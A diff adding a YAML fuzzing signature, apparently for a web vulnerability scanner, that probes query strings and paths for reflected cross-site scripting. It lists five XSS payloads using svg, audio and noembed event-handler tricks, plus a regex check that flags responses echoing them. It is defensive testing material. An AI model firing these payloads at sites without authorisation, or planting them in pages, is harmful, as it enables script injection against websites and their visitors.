@@ -1,0 +1,25 @@
+# info to search signature
+id: reflected-xss-fuzz
+type: fuzz
+level: 4
+info:
+  name: Reflected XSS Potential
+  risk: Medium
+variables:
+  - xss: |
+      <svg><animate onend=console.log(1) attributeName=x dur=1s>
+      <svg/onload=alert`1`>
+      <xss onmousemove=alert(1) style=display:block>test</xss>
+      <audio/src/onerror=eval(name)>
+      <noembed><img title=\"</noembed><img src onerror=alert(1)>\"></noembed>
+payloads:
+    - '{{.xss}}'
+requests:
+  - generators:
+      - Query("[[.original]]{{.payload}}")
+      - Path("{{.payload}}", "*")
+    detections:
+      - >-
+        (RegexSearch("resHeaders", "(?i)content-type: text\\/html") || !RegexSearch("resHeaders", "(?i)content-type")) && StringSearch("response", "{{.payload}}")
+references:
+  - link: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
